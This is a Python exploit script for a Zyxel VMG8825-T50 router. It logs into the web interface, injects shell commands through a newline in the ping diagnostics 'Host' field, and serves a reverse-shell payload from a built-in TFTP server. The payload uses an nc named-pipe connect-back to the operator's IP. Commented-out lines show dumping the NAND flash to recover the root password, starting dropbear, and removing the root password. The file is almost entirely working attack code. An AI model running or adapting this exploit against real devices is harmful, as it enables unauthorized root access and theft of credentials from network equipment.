import requests
import base64
import json
import time
import logging
import sys
import socket
import threading
import struct
from getpass import getpass

from Crypto.PublicKey import RSA # pip install cryptodome
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Cipher import PKCS1_v1_5

DEBUG = False

class VMG8825_T50_Web(object):

	def __init__(self, url, user, password):
		self.url = url
		self.user = user
		self.password = password

		self.r = requests.Session()
		self.r.trust_env = False # ignore proxy settings

		# we define the AesKey ourselves
		self.aes_key = b'\x42'*32
		self.sessionkey = None

		if DEBUG:
			# Logging verbose http requests
			import http.client as http_client
			http_client.HTTPConnection.debuglevel = 1
			logging.basicConfig()
			logging.getLogger().setLevel(logging.DEBUG)
			requests_log = logging.getLogger("urllib3")
			requests_log.setLevel(logging.DEBUG)
			requests_log.propagate = True


	def _encrypt_request(self, data):
		iv = b'\x42'*16

		cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
		content = cipher.encrypt(pad(json.dumps(data).encode('ascii'), 16))

		request = {
			"content": base64.b64encode(content).decode('ascii'),
			"iv": base64.b64encode(iv).decode('ascii'),
			"key": ""
		}

		# print(f"[encrypt] before='{json.dumps(data)}' after='{json.dumps(request)}'")

		return request

	def _decrypt_response(self, data):
		if not 'iv' in data or not 'content' in data:
			print(f"response not encrypted! Response: {data}")
			return data

		iv = base64.b64decode(data['iv'])[:16]
		content = data['content']

		cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
		result = unpad(cipher.decrypt(base64.b64decode(content)), 16)

		return result

	def perform_login(self):
		# get pub key
		res = self.r.get(f"{self.url}/getRSAPublickKey")
		pubkey_str = res.json()['RSAPublicKey'] 

		

		# Encrypt the aes key with RSA pubkey of the device
		pubkey = RSA.import_key(pubkey_str)
		cipher_rsa = PKCS1_v1_5.new(pubkey)
		enc_aes_key = cipher_rsa.encrypt(base64.b64encode(self.aes_key))

		
		login_data = {
			"Input_Account": self.user,
			"Input_Passwd": base64.b64encode(self.password.encode('ascii')).decode('ascii'),
			"RememberPassword": 0,
			"SHA512_password": False
		}

		enc_request = self._encrypt_request(login_data)
		enc_request['key'] = base64.b64encode(enc_aes_key).decode('ascii')
		enc_response = self.r.post(f"{self.url}/UserLogin", json.dumps(enc_request))
		response = json.loads(self._decrypt_response(enc_response.json()))

		if 'result' in response and response['result'] == 'ZCFG_SUCCESS':
			self.sessionkey = response['sessionkey']
			return True
		else:
			return False


	def perform_logout(self):
		# http://192.168.0.1/cgi-bin/UserLogout?sessionkey=173783345
		response = self.r.post(f"{self.url}/cgi-bin/UserLogout?sessionKey={self.sessionkey}")
		response = response.json()

		if 'result' in response and response['result'] == 'ZCFG_SUCCESS':
			return True
		else:
			return False


	def do_ping_cmd_injection(self, cmd):
		print(f"Sending command: {repr(cmd)}")
		# host = "a\npasswd -d root\n"
		host = f"a\n{cmd}"

		data = {
			"ProtocolVersion": "IPv4",
			"Host": host,
			"DiagnosticsState": "Requested",
			"DNSServer": "",
			"NumberOfRepetitions": 4,
			"type": 1
				# IP_DIAG_IPPING: 0,
				# IP_DIAG_TRACE_RT: 1,
				# DNS_DIAG_NS_LOOKUP: 2,
		}
		res_enc = self.r.put(f"{self.url}/cgi-bin/DAL?oid=PINGTEST&sessionkey={self.sessionkey}", json.dumps(self._encrypt_request(data)))
		res = json.loads(self._decrypt_response(res_enc.json()))
		# print(f"res = {res}")

		time.sleep(2)

		res_enc = self.r.get(f"{self.url}/cgi-bin/Diagnostic_Result&sessionkey={self.sessionkey}")
		
		res = json.loads(self._decrypt_response(res_enc.json()))
		# print(f"res = {res}")


# Super basic TFTP server
def tftp_server(inj_cmd):
	TFTPD_IP = "0.0.0.0"
	TFTPD_PORT = 1337
	
	print("[tftpd] listening..")
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.bind((TFTPD_IP, TFTPD_PORT))

	totaldata = bytearray()
	block_nr = 0
	while True:
		data, addr = sock.recvfrom(1024)
		if data[1] == 0x01:
			# RRQ, initial msg with filename
			print("RRQ")

			# Send file in one DATA reply
			sock.sendto(b"\x00\x03\x00\x01" + inj_cmd + b"\x00", addr)

			# We're done
			break

	print("[tftpd] done")

if __name__ == "__main__":
	DEFAULT_HOST = "192.168.0.1"
	DEFAULT_USER = "admin"
	
	# Interactive input
	host = input(f"Host [{DEFAULT_HOST}]: ") or DEFAULT_HOST
	my_ip = input("My LAN IP: ")
	username = input(f"Username [{DEFAULT_USER}]: ") or DEFAULT_USER
	password = getpass("Password: ")

	url = f"http://{host}"

	# Check info
	try:
		info = requests.get(f"{url}/getBasicInformation")
		device_model = info.json()["ModelName"]
		firmware_version = info.json()["SoftwareVersion"]
	except:
		print("Couldn't get firmware version, check the hostname.")
		sys.exit(1)


	print(f"\nModel: {device_model}")
	print(f"Firmware version: {firmware_version}\n")

	print("Spawning connect back shell to port 13373. Make sure to open a listener..")

	# Log in
	router = VMG8825_T50_Web(url, username, password)
	status = router.perform_login()
	if not status:
		print("Login failed. Check the credentials.")
		sys.exit(1)

	# Start basic TFTP server
	inj_cmd = f"/bin/mknod /tmp/a p; /usr/bin/nc {my_ip} 13373 </tmp/a | /bin/ash >/tmp/a 2>&1;"
	t = threading.Thread(target=tftp_server, args=(inj_cmd.encode("utf-8"),))
	t.start()

	# router.do_ping_cmd_injection("openssl base64 -in /dev/mtd0 -out /tmp/mtd0\ncat /tmp/mtd0 --")

	# TFTP send NAND flash to grab root password
	# router.do_ping_cmd_injection(f"tftp -p -l /dev/mtd0 {my_ip} 1337\ndropbear -F -E -p 2222\n")

	# New technique: send reverse shell script and run it
	router.do_ping_cmd_injection(f"tftp -g -l /tmp/x.sh {my_ip} 1337\nsleep 5\nsh /tmp/x.sh\n")
	


	# Wait for file to come in
	t.join()

	# Try to log out
	# router.perform_logout()
